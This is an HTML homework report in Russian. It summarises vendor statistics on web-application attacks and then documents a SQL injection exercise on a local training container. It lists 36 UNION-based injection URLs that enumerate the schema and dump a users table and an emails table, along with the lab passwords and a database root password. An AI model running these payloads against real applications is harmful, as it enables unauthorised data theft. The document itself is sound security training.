@@ -1,0 +1,141 @@
+<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>????? ?? ????????? ???????: ???-?????????? ? SQL-????????</title>
+  <style>
+    :root { color-scheme: light; --ink:#172033; --muted:#5b6475; --line:#d8dee9; --soft:#f6f8fb; --accent:#0f766e; --code:#eef2f7; }
+    * { box-sizing: border-box; }
+    body { margin: 0; font: 16px/1.58 -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif; color: var(--ink); background: #fff; }
+    main { max-width: 1120px; margin: 0 auto; padding: 42px 28px 64px; }
+    h1, h2, h3 { line-height: 1.22; margin: 1.35em 0 .55em; letter-spacing: 0; }
+    h1 { margin-top: 0; font-size: 2rem; border-bottom: 3px solid var(--accent); padding-bottom: .55rem; }
+    h2 { font-size: 1.45rem; border-bottom: 1px solid var(--line); padding-bottom: .3rem; }
+    h3 { font-size: 1.15rem; color: #263247; }
+    p { margin: .75rem 0; }
+    a { color: #0b63b6; text-decoration: none; overflow-wrap: anywhere; }
+    a:hover { text-decoration: underline; }
+    code { font-family: Consolas, "Cascadia Mono", Menlo, monospace; background: var(--code); border-radius: 4px; padding: .12rem .28rem; font-size: .92em; }
+    pre { overflow: auto; background: #111827; color: #f8fafc; border-radius: 8px; padding: 16px; border: 1px solid #0f172a; }
+    pre code { background: transparent; color: inherit; padding: 0; font-size: .9rem; }
+    ul, ol { padding-left: 1.35rem; margin: .55rem 0 1rem; }
+    li { margin: .28rem 0; }
+    .table-wrap { overflow-x: auto; margin: 1rem 0 1.25rem; border: 1px solid var(--line); border-radius: 8px; }
+    table { border-collapse: collapse; width: 100%; min-width: 680px; }
+    th, td { padding: 10px 12px; border-bottom: 1px solid var(--line); vertical-align: top; text-align: left; }
+    th { background: var(--soft); font-weight: 700; }
+    tr:last-child td { border-bottom: 0; }
+    td:first-child, th:first-child { width: 1%; white-space: nowrap; }
+    @media print { body { font-size: 12px; } main { max-width: none; padding: 16px; } a { color: inherit; } pre, .table-wrap { break-inside: avoid; } }
+  </style>
+</head>
+<body>
+<main>
+<h1>Отчет по домашнему заданию: веб-уязвимости и SQL-инъекция</h1>
+<p>Дата выполнения: 30.04.2026</p>
+<h2>Часть I. Статистика по атакам через веб-уязвимости</h2>
+<h3>Использованные источники</h3>
+<ol>
+<li>Positive Technologies, &quot;Итоги проектов по расследованию инцидентов и ретроспективному анализу - 2024-2025&quot;  </li>
+<p><a href="https://www.ptsecurity.com/research/analytics/results-of-incident-investigation-and-retrospective-analysis-projects-2024-2025/">https://www.ptsecurity.com/research/analytics/results-of-incident-investigation-and-retrospective-analysis-projects-2024-2025/</a></p>
+<li>Positive Technologies / K2 Cloud через Anti-Malware.ru, &quot;Как меняется защита веб-приложений&quot;, 15.08.2024  </li>
+<p><a href="https://www.anti-malware.ru/analytics/Technology_Analysis/How-Web-Application-Security-Is-Changing">https://www.anti-malware.ru/analytics/Technology_Analysis/How-Web-Application-Security-Is-Changing</a></p>
+<li>Forescout Vedere Labs, &quot;2024 Threat Roundup&quot;, 27.01.2025  </li>
+<p><a href="https://www.forescout.com/press-releases/forescout-announces-2024-threat-roundup-report/">https://www.forescout.com/press-releases/forescout-announces-2024-threat-roundup-report/</a></p>
+<li>Akamai, &quot;Web Attacks Targeting Applications and APIs Up by 49% in the Last Year&quot;, 30.07.2024  </li>
+<p><a href="https://www.akamai.com/newsroom/press-release/web-attacks-targeting-applications-and-apis-up-by-49-in-the-last-year">https://www.akamai.com/newsroom/press-release/web-attacks-targeting-applications-and-apis-up-by-49-in-the-last-year</a></p>
+<li>Cloudflare, &quot;State of Application Security 2024&quot;, пресс-релиз, 25.06.2024  </li>
+<p><a href="https://www.cloudflare.com/en-ca/press-releases/2024/new-cloudflare-report-shows-organizations-struggle-with-outdated-security/">https://www.cloudflare.com/en-ca/press-releases/2024/new-cloudflare-report-shows-organizations-struggle-with-outdated-security/</a></p>
+<li>Kaspersky, &quot;Access control and data exposure flaws prevalent in corporate web applications&quot;, 12.03.2024  </li>
+<p><a href="https://usa.kaspersky.com/about/press-releases/access-control-and-data-exposure-flaws-prevalent-in-corporate-web-applications-kaspersky-study-finds">https://usa.kaspersky.com/about/press-releases/access-control-and-data-exposure-flaws-prevalent-in-corporate-web-applications-kaspersky-study-finds</a></p>
+<li>Radware, &quot;2024 Global Threat Analysis Report&quot;  </li>
+<p><a href="https://www.radware.com/getattachment/88a6c3e7-e8c5-4a7f-a53d-6fba9cdffe03/Radware_ThreatReport_Report_2024_RW-459.pdf.aspx">https://www.radware.com/getattachment/88a6c3e7-e8c5-4a7f-a53d-6fba9cdffe03/Radware_ThreatReport_Report_2024_RW-459.pdf.aspx</a></p>
+<li>AIONCLOUD, &quot;2024.10 Web Attack Trend Report&quot;, 22.11.2024  </li>
+<p><a href="https://www.aioncloud.com/2024-10-web-attack-trend-report/">https://www.aioncloud.com/2024-10-web-attack-trend-report/</a></p>
+<li>Verizon, &quot;2024 Data Breach Investigations Report&quot;  </li>
+<p><a href="https://www.verizon.com/business/resources/reports/dbir.html">https://www.verizon.com/business/resources/reports/dbir.html</a></p>
+</ol>
+<h3>Доля атак через веб-уязвимости и веб-приложения</h3>
+<p>Данные отличаются, потому что источники считают разные события: успешные инциденты, все зафиксированные попытки атак, WAF-срабатывания или результаты пентестов.</p>
+<div class="table-wrap"><table><thead><tr><th>Источник</th><th>Scope исследования</th><th>Что показывает</th></tr></thead><tbody><tr><td>Positive Technologies, IR 2024-2025</td><td>100+ проектов расследования и ретроспективного анализа за период IV кв. 2024 - III кв. 2025</td><td>В 36% случаев исходной точкой проникновения были бизнес-приложения на сетевом периметре. Это близко к требуемой метрике, потому что речь идет о расследованных реальных инцидентах.</td></tr><tr><td>Positive Technologies / Anti-Malware, 2024</td><td>Российский рынок, обобщение наблюдений Positive Technologies за три года</td><td>За последние три года в 63% случаев веб-приложения были исходным вектором атаки.</td></tr><tr><td>Verizon DBIR 2024</td><td>30 458 инцидентов и 10 626 подтвержденных утечек</td><td>Паттерн Basic Web Application Attacks составил чуть более 8% подтвержденных breaches; внутри него чаще использовались украденные учетные данные, но эксплуатация уязвимостей также присутствовала как часть сценария.</td></tr><tr><td>Forescout 2024 Threat Roundup</td><td>900 млн атак в телеметрии Forescout</td><td>Веб-приложения были самым атакуемым типом сервиса: 41% атак в 2024 году против 26% в 2022-2023. Эксплойты против веб-приложений выросли с 36% в 2023 до 56% в 2024.</td></tr><tr><td>Akamai SOTI 2024</td><td>Глобальная телеметрия Akamai Connected Cloud</td><td>В июне 2024 зафиксировано более 26 млрд атак на приложения и API; за год рост составил 49%. Среди частых векторов указаны LFI, XSS, SQLi, command injection, SSRF.</td></tr><tr><td>Cloudflare State of Application Security 2024</td><td>Трафик Cloudflare с 01.04.2023 по 31.03.2024</td><td>Cloudflare mitigated 6.8% всего web application/API traffic; DDoS составил 37.1% mitigated application traffic, bad bots - 31.2% всего трафика. Это не только эксплуатация уязвимостей, но показывает нагрузку на веб-слой.</td></tr></tbody></table></div>
+<p>Вывод: для успешных расследованных атак наиболее применим показатель Positive Technologies 2024-2025: 36% проникновений начались через бизнес-приложения на периметре. Если брать более широкий российский scope за несколько лет, встречается оценка 63% случаев, где веб-приложения были исходным вектором. По глобальной телеметрии попыток атак доля веб-приложений также очень высокая: Forescout фиксирует 41% атак именно на web applications как наиболее атакуемый тип сервиса.</p>
+<h3>Распределение по конкретным уязвимостям</h3>
+<p>Kaspersky исследовала корпоративные веб-приложения, разработанные компаниями для себя, в 2021-2023 годах. Это не статистика успешных атак, а доля приложений, где нашли конкретные классы уязвимостей:</p>
+<div class="table-wrap"><table><thead><tr><th>Класс уязвимости</th><th>Доля приложений, где найдено</th><th>Доля high-risk внутри класса</th></tr></thead><tbody><tr><td>Broken Access Control</td><td>70%</td><td>37%</td></tr><tr><td>Sensitive Data Exposure</td><td>70%</td><td>9%</td></tr><tr><td>Cross-Site Scripting (XSS)</td><td>61%</td><td>11%</td></tr><tr><td>Server-Side Request Forgery (SSRF)</td><td>57%</td><td>15%</td></tr><tr><td>Broken Authentication</td><td>52%</td><td>21%</td></tr><tr><td>SQL Injection</td><td>43%</td><td>88%</td></tr><tr><td>Security Misconfiguration</td><td>43%</td><td>15%</td></tr><tr><td>Insufficient Protection from Brute Force Attacks</td><td>39%</td><td>11%</td></tr><tr><td>Weak User Password</td><td>22%</td><td>78%</td></tr><tr><td>Using Components with Known Vulnerabilities</td><td>13%</td><td>43%</td></tr></tbody></table></div>
+<p>Radware приводит распределение web application security violations в WAF-телеметрии за 2023 год:</p>
+<div class="table-wrap"><table><thead><tr><th>Тип нарушения / атаки</th><th>Доля</th></tr></thead><tbody><tr><td>Predictable Resource Location</td><td>29.5%</td></tr><tr><td>Code Injection</td><td>19.3%</td></tr><tr><td>SQL Injection</td><td>12.9%</td></tr><tr><td>Server Information Leakage</td><td>7.74%</td></tr><tr><td>Session Flow Violation</td><td>7.47%</td></tr><tr><td>Security Misconfiguration</td><td>6.48%</td></tr><tr><td>Cross-Site Scripting</td><td>5.69%</td></tr><tr><td>Server Misconfiguration</td><td>2.81%</td></tr><tr><td>Folder Access Violation</td><td>2.32%</td></tr><tr><td>Path Traversal</td><td>2.30%</td></tr><tr><td>Unauthorized Access Attempt</td><td>2.25%</td></tr><tr><td>URL Access Violation</td><td>1.08%</td></tr><tr><td>Application Information Leakage</td><td>0.202%</td></tr></tbody></table></div>
+<p>AIONCLOUD за октябрь 2024 года по логам AIWAF дает похожий срез именно попыток веб-атак:</p>
+<div class="table-wrap"><table><thead><tr><th>Тип атаки</th><th>Доля</th></tr></thead><tbody><tr><td>SQL Injection</td><td>37.54%</td></tr><tr><td>App Weak</td><td>19.78%</td></tr><tr><td>Default Page</td><td>18.10%</td></tr><tr><td>Directory Traversal</td><td>9.91%</td></tr></tbody></table></div>
+<p>Короткий вывод по распределению: SQL-инъекции остаются заметным и высокорисковым классом. У Kaspersky 43% проверенных корпоративных приложений содержали SQLi, причем 88% найденных SQLi были high-risk. В WAF-телеметрии SQLi занимает 12.9% у Radware и 37.54% у AIONCLOUD за октябрь 2024, но эти цифры нельзя напрямую сравнивать: у них разные выборки и правила классификации.</p>
+<h2>Часть II. Практика SQL-инъекции</h2>
+<h3>Подготовка</h3>
+<p>Docker и Docker Compose уже установлены:</p>
+<pre><code class="language-text">Docker version 28.1.1, build 4eba377
+Docker Compose version v2.35.1-desktop.1</code></pre>
+<p>В рабочую папку добавлен <code>docker-compose.yml</code> с сервисами:</p>
+<pre><code class="language-yaml">services:
+  web:
+    image: ket9/otus-devsecops:latest
+    platform: linux/amd64
+    depends_on:
+      - db
+    ports:
+      - &quot;8080:80&quot;
+
+  db:
+    image: mysql:5.7
+    platform: linux/amd64
+    ports:
+      - &quot;8989:3306&quot;
+    environment:
+      MYSQL_ROOT_PASSWORD: &quot;Vdjo7#l-er&quot;</code></pre>
+<p>На машине уже был поднят такой же контейнерный стенд: <code>ket9/otus-devsecops:latest</code> на <code>localhost:8080</code> и MySQL на <code>localhost:8989</code>. База была инициализирована штатной ссылкой:</p>
+<pre><code class="language-text">http://localhost:8080/sql-connections/setup-db.php</code></pre>
+<h3>Ход рассуждений</h3>
+<ol>
+<li>Открыл главную страницу и страницу задания. Приложение просит передать <code>id</code> как GET-параметр: <code>/task?id=...</code>.</li>
+<li>Запрос <code>id=1</code> вернул пользователя <code>admin</code>, значит параметр попадает в SQL-запрос.</li>
+<li>Запрос с одинарной кавычкой <code>id=1&#x27;</code> вернул ошибку SQL-синтаксиса. Из этого следует, что значение параметра, вероятно, подставляется в строку SQL внутри кавычек. Поэтому полезная нагрузка должна закрывать кавычку и комментировать хвост запроса символом <code>#</code>.</li>
+<li>Через <code>ORDER BY</code> было установлено число колонок: <code>ORDER BY 1</code>, <code>ORDER BY 2</code>, <code>ORDER BY 3</code> работают, а <code>ORDER BY 4</code> дает ошибку <code>Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;</code>. Значит в исходном SELECT три колонки.</li>
+<li>Через <code>UNION SELECT 1,2,3</code> проверено, какие колонки выводятся на страницу. На экране видны первая и вторая колонки: <code>Ваш id</code> и <code>Ваш логин</code>.</li>
+<li>Через <code>database(), user(), version()</code> определено имя базы: <code>security</code>.</li>
+<li>Через <code>information_schema.tables</code> найдены таблицы: <code>emails</code>, <code>users</code>.</li>
+<li>Через <code>information_schema.columns</code> найдены колонки:</li>
+<ul>
+<li><code>users</code>: <code>id</code>, <code>username</code>, <code>password</code></li>
+<li><code>emails</code>: <code>id</code>, <code>email_id</code></li>
+</ul>
+<li>Через <code>group_concat</code> выгружены данные из <code>users</code> и <code>emails</code>.</li>
+</ol>
+<h3>Ответы на задания</h3>
+<ol>
+<li>Пароль пользователя <code>Volk2</code>: <code>Wa spoiuuuuu</code></li>
+<li>Почта пользователя <code>Vinni-pukh</code>: <code>honey_lover@otus-lab.com</code></li>
+</ol>
+<h3>Все отправленные URL</h3>
+<div class="table-wrap"><table><thead><tr><th>N</th><th>URL</th><th>Результат / зачем отправлялся</th></tr></thead><tbody><tr><td>1</td><td><code>http://localhost:8080/</code></td><td>Главная страница стенда.</td></tr><tr><td>2</td><td><code>http://localhost:8080/task</code></td><td>Страница задания, без <code>id</code> данных не выводит.</td></tr><tr><td>3</td><td><code>http://localhost:8080/task?id=1</code></td><td>Проверка параметра: вернул <code>admin</code>.</td></tr><tr><td>4</td><td><code>http://localhost:8080/sql-connections/setup-db.php</code></td><td>Установка/сброс базы, успешное обновление БД.</td></tr><tr><td>5</td><td><code>http://localhost:8080/task?id=1%27</code></td><td>Неудачная проба с кавычкой; вернула SQL syntax error.</td></tr><tr><td>6</td><td><code>http://localhost:8080/task?id=1%20OR%201=1</code></td><td>Неудачная проба без закрытия кавычки; вывела обычный <code>admin</code>.</td></tr><tr><td>7</td><td><code>http://localhost:8080/task?id=1%20ORDER%20BY%201</code></td><td>Неудачная/неинформативная проба без закрытия кавычки; вывела <code>admin</code>.</td></tr><tr><td>8</td><td><code>http://localhost:8080/task?id=1%20ORDER%20BY%202</code></td><td>Неудачная/неинформативная проба без закрытия кавычки; вывела <code>admin</code>.</td></tr><tr><td>9</td><td><code>http://localhost:8080/task?id=1%20ORDER%20BY%203</code></td><td>Неудачная/неинформативная проба без закрытия кавычки; вывела <code>admin</code>.</td></tr><tr><td>10</td><td><code>http://localhost:8080/task?id=1%20ORDER%20BY%204</code></td><td>Неудачная/неинформативная проба без закрытия кавычки; вывела <code>admin</code>.</td></tr><tr><td>11</td><td><code>http://localhost:8080/task?id=1%20ORDER%20BY%205</code></td><td>Неудачная/неинформативная проба без закрытия кавычки; вывела <code>admin</code>.</td></tr><tr><td>12</td><td><code>http://localhost:8080/task?id=-1%20UNION%20SELECT%201,2,3</code></td><td>Неудачная проба <code>UNION</code> без закрытия кавычки; данных не дала.</td></tr><tr><td>13</td><td><code>http://localhost:8080/task?id=-1%20UNION%20SELECT%201,2</code></td><td>Неудачная проба <code>UNION</code> с неверной структурой; данных не дала.</td></tr><tr><td>14</td><td><code>http://localhost:8080/task?id=1%27%20OR%20%271%27=%271%27%23</code></td><td>Успешная проверка инъекции с закрытием кавычки и комментарием; вернул <code>admin</code>.</td></tr><tr><td>15</td><td><code>http://localhost:8080/task?id=1%27%20ORDER%20BY%201%23</code></td><td>Проверка числа колонок: работает.</td></tr><tr><td>16</td><td><code>http://localhost:8080/task?id=1%27%20ORDER%20BY%202%23</code></td><td>Проверка числа колонок: работает.</td></tr><tr><td>17</td><td><code>http://localhost:8080/task?id=1%27%20ORDER%20BY%203%23</code></td><td>Проверка числа колонок: работает.</td></tr><tr><td>18</td><td><code>http://localhost:8080/task?id=1%27%20ORDER%20BY%204%23</code></td><td>Проверка числа колонок: ошибка <code>Unknown column &#x27;4&#x27;</code>; значит колонок 3.</td></tr><tr><td>19</td><td><code>http://localhost:8080/task?id=1%27%20ORDER%20BY%205%23</code></td><td>Дополнительная проверка: ошибка <code>Unknown column &#x27;5&#x27;</code>.</td></tr><tr><td>20</td><td><code>http://localhost:8080/task?id=1%27%20ORDER%20BY%206%23</code></td><td>Дополнительная проверка: ошибка <code>Unknown column &#x27;6&#x27;</code>.</td></tr><tr><td>21</td><td><code>http://localhost:8080/task?id=1%27%20ORDER%20BY%207%23</code></td><td>Дополнительная проверка: ошибка <code>Unknown column &#x27;7&#x27;</code>.</td></tr><tr><td>22</td><td><code>http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,2,3%23</code></td><td>Проверка <code>UNION</code> на 3 колонки: вывел <code>Ваш id:1</code>, <code>Ваш логин:2</code>.</td></tr><tr><td>23</td><td><code>http://localhost:8080/task?id=-1%27%20UNION%20SELECT%20database(),user(),version()%23</code></td><td>Определены БД и пользователь: <code>security</code>, <code>root@...</code>; версия ушла в невидимую 3-ю колонку.</td></tr><tr><td>24</td><td><code>http://localhost:8080/task?id=-1%27%20UNION%20SELECT%20null,null,null%23</code></td><td>Проверка <code>null</code> в колонках; вывел пустые значения.</td></tr><tr><td>25</td><td><code>http://localhost:8080/task?id=-1%27%20UNION%20SELECT%20group_concat(table_name),2,3%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%23</code></td><td>Найдены таблицы: <code>emails,users</code>.</td></tr><tr><td>26</td><td><code>http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,group_concat(table_name),3%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%23</code></td><td>Те же таблицы выведены во 2-й видимой колонке: <code>emails,users</code>.</td></tr><tr><td>27</td><td><code>http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,group_concat(column_name),3%20FROM%20information_schema.columns%20WHERE%20table_schema=database()%20AND%20table_name=%27users%27%23</code></td><td>Колонки таблицы <code>users</code>: <code>id,username,password</code>.</td></tr><tr><td>28</td><td><code>http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,group_concat(column_name),3%20FROM%20information_schema.columns%20WHERE%20table_schema=database()%20AND%20table_name=%27emails%27%23</code></td><td>Колонки таблицы <code>emails</code>: <code>id,email_id</code>.</td></tr><tr><td>29</td><td><code>http://localhost:8080/task?id=-1%27%20UNION%20SELECT%20group_concat(column_name),2,3%20FROM%20information_schema.columns%20WHERE%20table_schema=database()%20AND%20table_name=%27users%27%23</code></td><td>Повторная проверка колонок <code>users</code> в 1-й видимой колонке.</td></tr><tr><td>30</td><td><code>http://localhost:8080/task?id=-1%27%20UNION%20SELECT%20group_concat(column_name),2,3%20FROM%20information_schema.columns%20WHERE%20table_schema=database()%20AND%20table_name=%27emails%27%23</code></td><td>Повторная проверка колонок <code>emails</code> в 1-й видимой колонке.</td></tr><tr><td>31</td><td><code>http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,group_concat(id,0x3a,username,0x3a,password%20separator%200x7c),3%20FROM%20users%23</code></td><td>Выгрузка <code>users</code>; содержит пароль <code>Volk2:Wa spoiuuuuu</code>.</td></tr><tr><td>32</td><td><code>http://localhost:8080/task?id=-1%27%20UNION%20SELECT%20group_concat(id,0x3a,username,0x3a,password%20separator%200x7c),2,3%20FROM%20users%23</code></td><td>Повторная выгрузка <code>users</code> в 1-й видимой колонке.</td></tr><tr><td>33</td><td><code>http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,group_concat(id,0x3a,email_id%20separator%200x7c),3%20FROM%20emails%23</code></td><td>Выгрузка <code>emails</code>; для id <code>4</code> почта <code>honey_lover@otus-lab.com</code>.</td></tr><tr><td>34</td><td><code>http://localhost:8080/task?id=-1%27%20UNION%20SELECT%20group_concat(id,0x3a,email_id%20separator%200x7c),2,3%20FROM%20emails%23</code></td><td>Повторная выгрузка <code>emails</code> в 1-й видимой колонке.</td></tr><tr><td>35</td><td><code>http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,password,3%20FROM%20users%20WHERE%20username=%27Volk2%27%23</code></td><td>Точечный запрос по заданию 1; вернул пароль <code>Wa spoiuuuuu</code>.</td></tr><tr><td>36</td><td><code>http://localhost:8080/task?id=-1%27%20UNION%20SELECT%201,email_id,3%20FROM%20emails%20WHERE%20id=(SELECT%20id%20FROM%20users%20WHERE%20username=%27Vinni-pukh%27)%23</code></td><td>Точечный запрос по заданию 2; вернул почту <code>honey_lover@otus-lab.com</code>.</td></tr></tbody></table></div>
+<h3>Фрагменты полученных данных</h3>
+<p>Из таблицы <code>users</code>:</p>
+<pre><code class="language-text">1:admin:kjhsd8@j0dfjk3$%jksli
+2:Volk:nu zayzc, nu pogodi!
+3:Matroskin:a ya vse chawe zame4aiu, 4to menya kak budto kto-to podmenil
+4:Vinni-pukh:Ya tu4ka-tu4ka-tu4ka
+5:Neznaika:na Lune
+6:kotenok:Gav
+7:Karlson:muwchina v samom rascvete sil
+8:Kesha:pust vsegda budet Vovka
+9:Volk2:Wa spoiuuuuu</code></pre>
+<p>Из таблицы <code>emails</code>:</p>
+<pre><code class="language-text">1:admin@otus-lab.com
+2:volchara1969@otus-lab.com
+3:matroskin_is_prostokvashino@otus-lab.com
+4:honey_lover@otus-lab.com
+5:ne.znaika@otus-lab.com
+6:kotenok@otus-lab.com
+7:karlson@otus-lab.com
+9:volk@otus-lab.com</code></pre>
+<p>Так как <code>Vinni-pukh</code> имеет <code>id=4</code> в таблице <code>users</code>, его почта берется из <code>emails.id=4</code>: <code>honey_lover@otus-lab.com</code>.</p>
+</main>
+</body>
+</html>
